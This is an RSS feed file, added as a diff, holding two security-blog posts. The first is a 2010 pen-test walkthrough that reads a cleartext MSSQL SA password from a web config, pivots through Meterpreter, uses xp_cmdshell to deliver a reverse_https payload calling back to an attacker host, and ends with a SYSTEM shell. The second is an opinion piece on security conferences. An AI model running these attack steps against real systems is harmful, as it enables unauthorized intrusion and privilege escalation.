@@ -1,0 +1,284 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Carnal0wnage on Room362</title>
+    <link>http://localhost:1313/tags/carnal0wnage/</link>
+    <description>Recent content in Carnal0wnage on Room362</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
+    <lastBuildDate>Fri, 07 May 2010 14:05:53 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/tags/carnal0wnage/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>0Exploit Privilege Escalation</title>
+      <link>http://localhost:1313/post/2010/2010570exploit-privilege-escalation-html/</link>
+      <pubDate>Fri, 07 May 2010 14:05:53 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2010/2010570exploit-privilege-escalation-html/</guid>
+      <description>&lt;p&gt;The other day &lt;a href=&#34;http://carnal0wange.attackresearch.com/&#34;&gt;Chris Gates&lt;/a&gt; posted an &lt;a href=&#34;http://carnal0wnage.attackresearch.com/node/417&#34;&gt;excellent blog post&lt;/a&gt; about the WebDAV hotness that &lt;a href=&#34;http://twitter.com/chrissullo&#34;&gt;Chris Sullo&lt;/a&gt; (author of &lt;a href=&#34;http://cirt.net/Nikto2&#34;&gt;Nikto&lt;/a&gt;) cooked up (&lt;a href=&#34;http://security.sunera.com/2010/04/davtest-quickly-test-exploit-webdav.html&#34;&gt;DAVTest&lt;/a&gt;) which &lt;a href=&#34;http://twitter.com/sussurro&#34;&gt;Ryan Linn&lt;/a&gt; popped out a &lt;a href=&#34;http://trac.happypacket.net/browser/msfmods/trunk/modules/auxiliary/scanner/http/webdav_test.rb&#34;&gt;Metasploit module&lt;/a&gt; for.&lt;/p&gt;
+
+&lt;p&gt;Anyways, the story left off being a very limited user called &amp;ldquo;Network Service&amp;rdquo;. This user has Read and Execute, but no Write access, and a very limited field of view to boot.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;meterpreter &amp;gt; getuid&lt;/p&gt;
+
+&lt;p&gt;Server username: &lt;strong&gt;NT AUTHORITYNETWORK SERVICE&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Lets look around a bit..&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;meterpreter &amp;gt; pwd&lt;/p&gt;
+
+&lt;p&gt;C:Inetpubwwwroot&lt;/p&gt;
+
+&lt;p&gt;meterpreter &amp;gt; ls&lt;/p&gt;
+
+&lt;p&gt;Listing: C:Inetpubwwwroot&lt;/p&gt;
+
+&lt;p&gt;===========================&lt;/p&gt;
+
+&lt;p&gt;Mode  Size  Type  Last modified  Name&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;40777/rwxrwxrwx  0  dir  Fri May 07 09:32:19 -0400 2010  .&lt;/p&gt;
+
+&lt;p&gt;40777/rwxrwxrwx  0  dir  Mon May 03 12:51:48 -0400 2010  ..&lt;/p&gt;
+
+&lt;p&gt;40777/rwxrwxrwx  0  dir  Mon May 03 12:12:57 -0400 2010  admin&lt;/p&gt;
+
+&lt;p&gt;100666/rw-rw-rw-  1587  fil  Sat Dec 08 23:01:24 -0500 2001  default.asp&lt;/p&gt;
+
+&lt;p&gt;100666/rw-rw-rw-  1465  fil  Sat Dec 08 23:01:24 -0500 2001  default.css&lt;/p&gt;
+
+&lt;p&gt;100666/rw-rw-rw-  3295  fil  Thu Jan 03 12:40:48 -0500 2002  forgotpass.asp&lt;/p&gt;
+
+&lt;p&gt;40777/rwxrwxrwx  0  dir  Mon May 03 12:12:57 -0400 2010  images&lt;/p&gt;
+
+&lt;p&gt;40777/rwxrwxrwx  0  dir  Mon May 03 12:12:57 -0400 2010  language&lt;/p&gt;
+
+&lt;p&gt;100666/rw-rw-rw-  1802  fil  Thu Jan 24 12:10:04 -0500 2002  logoff.asp&lt;/p&gt;
+
+&lt;p&gt;100666/rw-rw-rw-  7785  fil  Sat Jun 15 19:49:20 -0400 2002  logon.asp&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;100666/rw-rw-rw-  1801  fil  Mon May 03 12:42:45 -0400 2010  settings.asp&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;100666/rw-rw-rw-  21137  fil  Wed Aug 28 11:31:42 -0400 2002  setup.asp&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Sweet! a &amp;ldquo;settings.asp&amp;rdquo;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;meterpreter &amp;gt; cat settings.asp&lt;/p&gt;
+
+&lt;p&gt;&lt;SCRIPT LANGUAGE = &#34;VBScript&#34;&gt;&lt;/p&gt;
+
+&lt;p&gt;&amp;lt;(editorial snip)&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;SQLUser = &amp;ldquo;sa&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;SQLPass = &amp;ldquo;SuperDuper#@rdP@$$w0rd2012&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;&amp;lt;(/editorial snip)&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;/SCRIPT&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;SA with clear text password. Good luck bruteforcing that one. But they block 1433 directly to the box so direct SQL queries are out. No problem.&lt;/p&gt;
+
+&lt;p&gt;Pivoting to the rescue:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;meterpreter &amp;gt;&lt;/p&gt;
+
+&lt;p&gt;Background session 1? [y/N]&lt;/p&gt;
+
+&lt;p&gt;msf exploit(handler) &amp;gt; route add 192.168.56.0 255.255.255.0 1&lt;/p&gt;
+
+&lt;p&gt;msf exploit(handler) &amp;gt; route print&lt;/p&gt;
+
+&lt;p&gt;Active Routing Table&lt;/p&gt;
+
+&lt;p&gt;====================&lt;/p&gt;
+
+&lt;p&gt;Subnet  Netmask  Gateway&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;192.168.56.0  255.255.255.0  Session 1&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Then we use mssql_login to check to see if our creds are right (set BLANK_PASSWORDS to false since we already know the password and we aren&amp;rsquo;t trying to brute force it). This will be routed through our meterpreter session that has NETWORK SERVICE permissions.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;msf exploit(handler) &amp;gt; use scanner/mssql/mssql_login&lt;/p&gt;
+
+&lt;p&gt;msf auxiliary(mssql_login) &amp;gt; set BLANK_PASSWORDS false&lt;/p&gt;
+
+&lt;p&gt;BLANK_PASSWORDS =&amp;gt; false&lt;/p&gt;
+
+&lt;p&gt;msf auxiliary(mssql_login) &amp;gt; set PASSWORD SuperDuper#@rdP@$$w0rd2012&lt;/p&gt;
+
+&lt;p&gt;PASSWORD =&amp;gt; SuperDuper#@rdP@$$w0rd2012&lt;/p&gt;
+
+&lt;p&gt;msf auxiliary(mssql_login) &amp;gt; set RHOSTS 192.168.56.3&lt;/p&gt;
+
+&lt;p&gt;RHOSTS =&amp;gt; 192.168.56.3&lt;/p&gt;
+
+&lt;p&gt;msf auxiliary(mssql_login) &amp;gt; run&lt;/p&gt;
+
+&lt;p&gt;[*] 192.168.56.3:1433 - MSSQL - Trying username:&amp;lsquo;sa&amp;rsquo; with password:&amp;lsquo;SuperDuper#@rdP@$$w0rd2012&amp;rsquo;&lt;/p&gt;
+
+&lt;p&gt;[+] 192.168.56.3:1433 - &lt;strong&gt;MSSQL - successful login &amp;lsquo;sa&amp;rsquo; : &amp;lsquo;SuperDuper#@rdP@$$w0rd2012&amp;rsquo;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;[*] Scanned 1 of 1 hosts (100% complete)&lt;/p&gt;
+
+&lt;p&gt;[*] Auxiliary module execution completed&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Cool. Now some enumeration and check to see if xp_cmdshell is enabled (it outputs a lot of info so I cut it down to just the pieces we are looking for):&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;msf exploit(mssql_login) &amp;gt; use admin/mssql/mssql_enum&lt;/p&gt;
+
+&lt;p&gt;msf auxiliary(mssql_enum) &amp;gt; set PASSWORD SuperDuper#@rdP@$$w0rd2012&lt;/p&gt;
+
+&lt;p&gt;PASSWORD =&amp;gt; SuperDuper#@rdP@$$w0rd2012&lt;/p&gt;
+
+&lt;p&gt;smsf auxiliary(mssql_enum) &amp;gt; set RHOST 192.168.56.3&lt;/p&gt;
+
+&lt;p&gt;RHOST =&amp;gt; 192.168.56.3&lt;/p&gt;
+
+&lt;p&gt;msf auxiliary(mssql_enum) &amp;gt; run&lt;/p&gt;
+
+&lt;p&gt;[*] Running MS SQL Server Enumeration&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;[*] Version:&lt;/p&gt;
+
+&lt;p&gt;[*] Microsoft SQL Server  2000 - 8.00.194 (Intel X86)&lt;/p&gt;
+
+&lt;p&gt;[*] Aug  6 2000 00:57:48&lt;/p&gt;
+
+&lt;p&gt;[*] Copyright &amp;copy; 1988-2000 Microsoft Corporation&lt;/p&gt;
+
+&lt;p&gt;[*] Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)&lt;/p&gt;
+
+&lt;p&gt;&amp;lt;(editorial snip)&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;[*] **&lt;/strong&gt; **&lt;strong&gt;xp_cmdshell is Enabled&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&amp;lt;(/editorial snip)&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;[*] Instances found on this server:&lt;/p&gt;
+
+&lt;p&gt;[*]  MSSQLSERVER&lt;/p&gt;
+
+&lt;p&gt;[*] Default Server Instance SQL Server Service is running under the privilege of:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;[*] **&lt;/strong&gt; **&lt;strong&gt;LocalSystem&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;[*] Auxiliary module execution completed&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;XP_CMDSHELL and the server runs as local system. Looking good, payload time.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;msf auxiliary(mssql_enum) &amp;gt; use windows/mssql/mssql_payload&lt;/p&gt;
+
+&lt;p&gt;msf exploit(mssql_payload) &amp;gt; set PAYLOAD windows/meterpreter/reverse_https&lt;/p&gt;
+
+&lt;p&gt;PAYLOAD =&amp;gt; windows/meterpreter/reverse_https&lt;/p&gt;
+
+&lt;p&gt;msf exploit(mssql_payload) &amp;gt; set LHOST 10.10.10.59&lt;/p&gt;
+
+&lt;p&gt;LHOST =&amp;gt; 10.10.10.59&lt;/p&gt;
+
+&lt;p&gt;msf exploit(mssql_payload) &amp;gt; set RHOST 192.168.56.3&lt;/p&gt;
+
+&lt;p&gt;RHOST =&amp;gt; 192.168.56.3&lt;/p&gt;
+
+&lt;p&gt;msf exploit(mssql_payload) &amp;gt; set LPORT 443&lt;/p&gt;
+
+&lt;p&gt;LPORT =&amp;gt; 443&lt;/p&gt;
+
+&lt;p&gt;msf exploit(mssql_payload) &amp;gt; set PASSWORD SuperDuper#@rdP@$$w0rd2012&lt;/p&gt;
+
+&lt;p&gt;PASSWORD =&amp;gt; SuperDuper#@rdP@$$w0rd2012&lt;/p&gt;
+
+&lt;p&gt;msf exploit(mssql_payload) &amp;gt; exploit&lt;/p&gt;
+
+&lt;p&gt;[*] HTTPS listener started on &lt;a href=&#34;https://10.10.10.59:443/&#34;&gt;https://10.10.10.59:443/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;[*] Command Stager progress - 2.78% done (&lt;sup&gt;1494&lt;/sup&gt;&amp;frasl;&lt;sub&gt;53675&lt;/sub&gt; bytes)&lt;/p&gt;
+
+&lt;p&gt;[*] Command Stager progress - 5.57% done (&lt;sup&gt;2988&lt;/sup&gt;&amp;frasl;&lt;sub&gt;53675&lt;/sub&gt; bytes)&lt;/p&gt;
+
+&lt;p&gt;[*] Command Stager progress - 8.35% done (&lt;sup&gt;4482&lt;/sup&gt;&amp;frasl;&lt;sub&gt;53675&lt;/sub&gt; bytes)&lt;/p&gt;
+
+&lt;p&gt;&amp;lt;(editorial snip)&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;[*] Command Stager progress - 94.64% done (&lt;sup&gt;50796&lt;/sup&gt;&amp;frasl;&lt;sub&gt;53675&lt;/sub&gt; bytes)&lt;/p&gt;
+
+&lt;p&gt;[*] Command Stager progress - 97.32% done (&lt;sup&gt;52235&lt;/sup&gt;&amp;frasl;&lt;sub&gt;53675&lt;/sub&gt; bytes)&lt;/p&gt;
+
+&lt;p&gt;[*] 192.168.56.3:1061 Request received for /AvlbV&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;[*] 192.168.56.3:1061 Staging connection for target vlbV received&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;[*] Patching Target ID vlbV into DLL&lt;/p&gt;
+
+&lt;p&gt;[*] 192.168.56.3:1062 Request received for /BvlbV&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;[*] 192.168.56.3:1062 Stage connection for target vlbV received&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;[*] Meterpreter session 2 opened (10.10.10.59:443 -&amp;gt; 192.168.56.3:1062) at Thu May 06 22:03:50 -0400 2010&lt;/p&gt;
+
+&lt;p&gt;[*] Exploit completed, but no session was created.&lt;/p&gt;
+
+&lt;p&gt;msf exploit(mssql_payload) &amp;gt; sessions -i 2&lt;/p&gt;
+
+&lt;p&gt;[*] Starting interaction with 2&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;meterpreter &amp;gt; getuid&lt;/p&gt;
+
+&lt;p&gt;Server username: &lt;strong&gt;NT AUTHORITYSYSTEM&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Game over..&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Note: Routing only sends the module(be it exploit or aux) through the session. Once the payload runs (for exploit modules), it&amp;rsquo;s is calling straight back to the LHOST (Attacker box), not through the session. So, in this example you can now exit session 1 (NETWORK SERVICE) as it&amp;rsquo;s not really needed any more.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;**&lt;br /&gt;
+**&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Rant Back – ValSmith</title>
+      <link>http://localhost:1313/post/2009/2009611rant-back-valsmith-html/</link>
+      <pubDate>Thu, 11 Jun 2009 02:11:47 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2009/2009611rant-back-valsmith-html/</guid>
+      <description>&lt;p&gt;Val Smith recently wrote a post on the new &lt;a href=&#34;http://carnal0wnage.attackresearch.com&#34;&gt;Attack Research / carnal0wnage blog&lt;/a&gt; titled:&lt;br /&gt;
+”&lt;a href=&#34;http://carnal0wnage.attackresearch.com/node/361&#34;&gt;Security Conferences, pen tests and incident response&lt;/a&gt;”&lt;/p&gt;
+
+&lt;p&gt;Here are my thoughts on what he wrote:&lt;/p&gt;
+
+&lt;p&gt;In paragraphs 2-6 he talks about two points. The first being that Hacker Conferences have become sort of commercialized with most speakers going for their day in the lime light or to pimp some product/0day. And the second being a lot of the talks are things that most can’t go home / back to work and test out or implement.&lt;/p&gt;
+
+&lt;p&gt;I agree with him on both points.&lt;/p&gt;
+
+&lt;p&gt;On the first point I think that one detail was left out of this evaluation. Size. Back when DEFCON was &amp;lt;500 people, almost everyone knew each other. 90% of those attending had the passion, had the fire for that what makes our line of work such an art. Now that our community has become “popular”, that percentage is around 20-30%. These numbers aren’t based on any stats, just something that I have been observing as well.&lt;/p&gt;
+
+&lt;p&gt;On the second point, my first security conference was ShmooCon ‘06. I was glued to might seat in each talk I attended, and in just 3 short years I have seen EXACTLY what he’s talking about. I used to have to decide between awesome talks in the same hour. Now I actually find times where I’m not interested in anything being presented for that hour. But, rooms still get packed so I guess that’s just my own pickiness.&lt;/p&gt;
+
+&lt;p&gt;Penetration Testing and Incident is the second portion of his post and I really think he’s hit the nail on the head, Pen Testing and Incident Response should work closely together. I want to throw Vulnerability Assessment and Forensics into the mix as well, feeding each other, sharing data, and assisting. The segmentation of duties / teams is killing collaboration.&lt;/p&gt;
+
+&lt;p&gt;Lets get back to the basics, and really show what this community is capable of.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
